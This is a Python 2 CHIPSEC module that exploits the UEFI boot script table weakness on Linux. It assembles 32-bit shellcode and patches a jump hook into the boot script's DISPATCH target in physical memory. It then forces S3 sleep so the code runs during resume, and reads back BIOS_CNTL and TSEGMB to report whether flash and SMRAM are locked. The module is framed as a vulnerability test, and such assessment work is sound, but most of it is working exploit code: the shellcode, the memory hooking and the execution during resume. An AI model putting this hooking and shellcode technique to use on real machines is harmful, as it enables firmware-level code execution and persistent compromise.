import sys, os
from struct import pack, unpack
from capstone import *
from chipsec.module_common import *
from chipsec.hal.uefi import *
from chipsec.hal.physmem import *


_MODULE_NAME = 'boot_script_table'

PAYLOAD = '''

[bits 32]

; save registers
push    eax
push    edx
push    esi

call    _label

db      0ffh
dd      0 ; shellcode call counter
db      0 ; BIOS_CNTL value
dd      0 ; TSEGMB value

_label:

; get data address
pop     esi
inc     esi

; increment call counter
inc     dword [esi]

; exit if current call isn't first
cmp     byte [esi], 1
jne     _end

; bus = 0, dev = 0x1f, func = 0, offset = 0xdc
mov     eax, 0x8000f8dc
mov     dx, 0xcf8
out     dx, eax

; read BIOS_CNTL value
mov     dx, 0xcfc
in      al, dx

; save BIOS_CNTL value
mov     byte [esi + 4], al

; bus = 0, dev = 0, func = 0, offset = 0xb8
mov     eax, 0x800000b8
mov     dx, 0xcf8
out     dx, eax

; read TSEGMB value
mov     dx, 0xcfc
in      eax, dx

; save TSEGMB value
mov     dword [esi + 5], eax

_end:

; restore registers
pop     esi
pop     edx
pop     eax

'''


def _at(data, off, size, fmt): return unpack(fmt, data[off : off + size])[0]

def byte_at(data, off = 0): return _at(data, off, 1, 'B')
def word_at(data, off = 0): return _at(data, off, 2, 'H')
def dword_at(data, off = 0): return _at(data, off, 4, 'I')
def qword_at(data, off = 0): return _at(data, off, 8, 'Q')


class BootScriptParser(object):    

    EFI_BOOT_SCRIPT_IO_WRITE_OPCODE = 0x00
    EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE = 0x01
    EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE = 0x02
    EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE = 0x03
    EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE = 0x04
    EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE = 0x05
    EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE = 0x06
    EFI_BOOT_SCRIPT_STALL_OPCODE = 0x07
    EFI_BOOT_SCRIPT_DISPATCH_OPCODE = 0x08

    boot_script_ops = [
        'IO_WRITE',
        'IO_READ_WRITE',
        'MEM_WRITE',
        'MEM_READ_WRITE',
        'PCI_CONFIG_WRITE',
        'PCI_CONFIG_READ_WRITE',
        'SMBUS_EXECUTE',
        'STALL',
        'DISPATCH' ]

    EfiBootScriptWidthUint8 = 0
    EfiBootScriptWidthUint16 = 1
    EfiBootScriptWidthUint32 = 2
    EfiBootScriptWidthUint64 = 3
    EfiBootScriptWidthFifoUint8 = 4
    EfiBootScriptWidthFifoUint16 = 5
    EfiBootScriptWidthFifoUint32 = 6
    EfiBootScriptWidthFifoUint64 = 7
    EfiBootScriptWidthFillUint8 = 8
    EfiBootScriptWidthFillUint16 = 9
    EfiBootScriptWidthFillUint32 = 10
    EfiBootScriptWidthFillUint64 = 11

    boot_script_width = [
        'Uint8',
        'Uint16',
        'Uint32',
        'Uint64',
        'FifoUint8',
        'FifoUint16',
        'FifoUint32',
        'FifoUint64',
        'FillUint8',
        'FillUint16',
        'FillUint32',
        'FillUint64' ]

    def __init__(self, quiet = False):

        self.quiet = quiet

    def value_at(self, data, off, width):

        if width == self.EfiBootScriptWidthUint8: return byte_at(data, off)
        elif width == self.EfiBootScriptWidthUint16: return word_at(data, off)
        elif width == self.EfiBootScriptWidthUint32: return dword_at(data, off)
        elif width == self.EfiBootScriptWidthUint64: return qword_at(data, off)
        else: raise Exception('Invalid width 0x%x' % width)

    def width_size(self, width):

        if width == self.EfiBootScriptWidthUint8: return 1
        elif width == self.EfiBootScriptWidthUint16: return 2
        elif width == self.EfiBootScriptWidthUint32: return 4
        elif width == self.EfiBootScriptWidthUint64: return 8
        else: raise Exception('Invalid width 0x%x' % width)

    def log(self, data):

        if not self.quiet: print data

    def process_mem_write(self, width, addr, count, val):

        self.log(('Width: %s, Addr: 0x%.16x, Count: %d\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], addr, count, \
                  ', '.join(map(lambda v: hex(v), val))))

    def process_pci_config_write(self, width, bus, dev, fun, off, count, val):

        self.log(('Width: %s, Count: %d\n' + \
                  'Bus: 0x%.2x, Device: 0x%.2x, Function: 0x%.2x, Offset: 0x%.2x\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], count, bus, dev, fun, off, \
                  ', '.join(map(lambda v: hex(v), val))))

    def process_io_write(self, width, port, count, val):

        self.log(('Width: %s, Port: 0x%.4x, Count: %d\n' + \
                  'Value: %s\n') % \
                 (self.boot_script_width[width], port, count, \
                  ', '.join(map(lambda v: hex(v), val))))

    def process_dispatch(self, addr):

        self.log('Call addr: 0x%.16x' % (addr) + '\n')

    def read_values(self, data, width, count):

        values = []

        for i in range(0, count):

            # read single value of given width
            values.append(self.value_at(data, i * self.width_size(width), width))

        return values

    def parse(self, data, boot_script_addr = 0L):

        ptr = 0
        while data:

            num, size, op = unpack('IIB', data[:9])       

            if op == 0xff:

                self.log('# End of the boot script at offset 0x%x' % ptr)
                break

            elif op >= len(self.boot_script_ops):

                raise Exception('Invalid op 0x%x' % op)

            self.log('#%d len=%d %s' % (num, size, self.boot_script_ops[op]))

            if op == self.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 24)

                # get write adderss
                addr = qword_at(data, 16)

                # get values list
                values = self.read_values(data[32:], width, count)
                
                self.process_mem_write(width, addr, count, values)

            elif op == self.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 24)

                # get write adderss
                addr = qword_at(data, 16)                

                # get PCI device address
                bus, dev, fun, off = (addr >> 24) & 0xff, (addr >> 16) & 0xff, \
                                     (addr >> 8) & 0xff,  (addr >> 0) & 0xff                

                # get values list
                values = self.read_values(data[32:], width, count)

                self.process_pci_config_write(width, bus, dev, fun, off, count, values)

            elif op == self.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE:

                # get value information
                width, count = byte_at(data, 9), qword_at(data, 16)

                # get I/O port number
                port = word_at(data, 10)

                # get values list
                values = self.read_values(data[24:], width, count)

                self.process_io_write(width, port, count, values)

            elif op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:

                # get call address
                addr = qword_at(data, 16)

                self.process_dispatch(addr)

            else:

                # skip unknown instruction
                pass

            # go to the next instruction
            data = data[size:]
            ptr += size


class Asm(object):

    NASM = 'nasm'
    TEMP = '.prog'

    def __init__(self, path = None, bits = None):

        self.prog_src = self.TEMP + '.asm'
        self.prog_dst = self.TEMP + '.bin'
        self.nasm_path = self.NASM if path is None else path

    def prog_read(self):

        with open(self.prog_dst, 'rb') as fd: return fd.read()

    def prog_write(self, data):

        with open(self.prog_src, 'wb') as fd: fd.write(data)

    def compile_file(self, path):
        
        code = os.system('"%s" "%s" -o "%s"' % \
               (self.nasm_path, path, self.prog_dst))        

        if code != 0: raise Exception('nasm error %d' % code)

        # read compiled binary contents
        ret = self.prog_read()
        os.unlink(self.prog_dst)

        return ret

    def compile(self, prog):

        # write source into the .asm file
        self.prog_write(prog)

        # compile it with nasm
        ret = self.compile_file(self.prog_src)
        os.unlink(self.prog_src)

        return ret


class boot_script_table(BaseModule):

    EFI_VAR_NAME = 'AcpiGlobalVariable'
    EFI_VAR_GUID = 'af9ffd67-ec10-488a-9dfc-6cbf5ee22c2e'

    JUMP_32_LEN = 5
    JUMP_64_LEN = 14

    WAKE_AFTER = 10 # in seconds

    class CustomBootScriptParser(BootScriptParser):

        class AddressFound(Exception): 

            def __init__(self, addr):

                self.addr = addr
        
        def process_dispatch(self, addr):

            # pass dispatch instruction operand to the caller
            raise self.AddressFound(addr)

        def parse(self, data, boot_script_addr = 0L):

            try:

                BootScriptParser.parse(self, data, \
                    boot_script_addr = boot_script_addr)

            except self.AddressFound as e:

                return e.addr

            # boot script doesn't have any dispatch instructions
            return None

    def _efi_read_u32(self, name, guid):

        return dword_at(self._uefi.get_EFI_variable(name, guid, None))

    def _mem_read(self, addr, size):

        # align memory reads by 1000h
        read_addr = addr & 0xfffffffffffff000
        read_size = size + addr - read_addr

        data = self._memory.read_physical_mem(read_addr, read_size)
        return data[addr - read_addr:]

    def _mem_write(self, addr, data):

        self._memory.write_physical_mem(addr, len(data), data)

    def _disasm(self, data):

        dis = Cs(CS_ARCH_X86, CS_MODE_64)
        for insn in dis.disasm(data, len(data)): 

            return insn.mnemonic + ' ' + insn.op_str, insn.size

    def _jump_32(self, src, dst):

        print 'Jump from 0x%x to 0x%x' % (src, dst)

        addr = pack('I', (dst - src - self.JUMP_32_LEN) & 0xffffffff)
        return '\xe9' + addr

    def _jump_64(self, src, dst):

        print 'Jump from 0x%x to 0x%x' % (src, dst)

        addr = pack('Q', dst & 0xffffffffffffffff)
        return '\xff\x25\x00\x00\x00\x00' + addr

    def _find_zero_bytes(self, addr, size):

        addr = (addr & 0xfffff000) + 0x1000

        while True:

            # search for zero bytes at the end of the code page
            if self._mem_read(addr - size, size) == '\0' * size:

                addr -= size
                break

            addr += 0x1000

        return addr

    def _hook(self, addr, payload):        

        if self._mem_read(addr, 1) == '\xe9':

            print 'ERROR: Already patched'
            return None

        hook_size = 0
        data = self._mem_read(addr, 0x40)
        
        # disassembly instructions and determinate patch length
        while hook_size < self.JUMP_32_LEN:

            mnem, size = self._disasm(data[hook_size:])
            hook_size += size
        
        print '%d bytes to patch' % hook_size        

        # backup original code of the function
        data = data[:hook_size]

        # find zero memory for patch
        buff_size = len(payload) + hook_size + self.JUMP_32_LEN
        buff_addr = self._find_zero_bytes(addr, buff_size)

        print 'Found %d zero bytes at 0x%x' % (buff_size, buff_addr)

        # write payload + original bytes + jump back to hooked function
        buff = payload + data + \
               self._jump_32(buff_addr + len(payload) + hook_size, \
                             addr + hook_size)

        self._mem_write(buff_addr, buff)

        # write 32-bit jump from function to payload
        self._mem_write(addr, self._jump_32(addr, buff_addr))

        return buff_addr, buff_size, data
        
    def exploit(self):

        self.logger.start_test('UEFI boot script table vulnerability exploit')

        # read ACPI global variable structure data
        AcpiGlobalVariable = self._efi_read_u32(self.EFI_VAR_NAME, self.EFI_VAR_GUID)        
        
        print '[*] AcpiGlobalVariable = 0x%x' % AcpiGlobalVariable

        # get bootscript pointer
        data = self._mem_read(AcpiGlobalVariable, 0x20)
        boot_script = dword_at(data, 0x18)

        print '[*] UEFI boot script addr = 0x%x' % boot_script
        
        # read and parse boot script
        dispatch_addr = self.CustomBootScriptParser(quiet = True).parse( \
            self._mem_read(boot_script, 0x8000),
            boot_script_addr = boot_script)

        if dispatch_addr is None:

            print 'ERROR: Unable to find EFI_BOOT_SCRIPT_DISPATCH_OPCODE'
            return ModuleResult.ERROR

        print '[*] Target function addr = 0x%x' % dispatch_addr

        # compile exploitation payload
        payload = Asm().compile(PAYLOAD)

        # find offset of payload data area
        offset = payload.find('\xff' + '\0' * (4 + 1 + 4))
        if offset == -1: raise Exception('Invalid payload')

        # execute payload as UEFI function handler
        ret = self._hook(dispatch_addr, payload)
        if ret is not None:

            buff_addr, buff_size, old_data = ret

            print 'Going to S3 sleep for %d seconds ...' % self.WAKE_AFTER

            # go to the S3 sleep
            os.system('rtcwake -m mem -s %d' % self.WAKE_AFTER)

            # read BIOS_CNTL and TSEGMB values that obtained saved by payload
            data = self._mem_read(buff_addr + offset + 1, 4 + 1 + 4)
            count, BIOS_CNTL, TSEGMB = unpack('=IBI', data)

            if count == 0:

                print 'ERROR: shellcode was not executed during S3 resume'
                return ModuleResult.ERROR

            print '[*] BIOS_CNTL = 0x%.2x' % BIOS_CNTL
            print '[*] TSEGMB = 0x%.2x' % TSEGMB

            # restore modified memory
            self._mem_write(dispatch_addr, old_data)
            self._mem_write(buff_addr, '\0' * buff_size)

            # get bit at given position
            bitval = lambda val, b: 0L if val & (1L << b) == 0 else 1L
            success = True

            # bios lock enable bit of BIOS_CNTL
            BLE = 1

            # check if access to flash is locked
            if bitval(BIOS_CNTL, BLE) == 0:

                print '[!] Bios lock enable bit is not set'
                success = False

            else:

                print '[*] Bios lock enabled bit is set'

            # check if access to SMRAM via DMA is locked
            if TSEGMB & 1 == 0:

                print '[!] SMRAM is not locked'
                success = False

            else:

                print '[*] SMRAM is locked'
            
            if success:

                print '[*] Your system is NOT VULNERABLE'
                return ModuleResult.PASSED

            else:

                print '[!] Your system is VULNERABLE'
                return ModuleResult.FAILED

        return ModuleResult.ERROR        

    def is_supported(self):

        supported = 'linux' in sys.platform
        if not supported:

            print '[!] boot_script_table module is linux-only'
            return False

        return True

    # --------------------------------------------------------------------------
    # run(module_argv)
    # Required function: run here all tests from this module
    # --------------------------------------------------------------------------
    def run(self, module_argv):

        self._uefi = UEFI(self.cs.helper)
        self._memory = Memory(self.cs.helper)

        return self.exploit()

#
# EoF
#
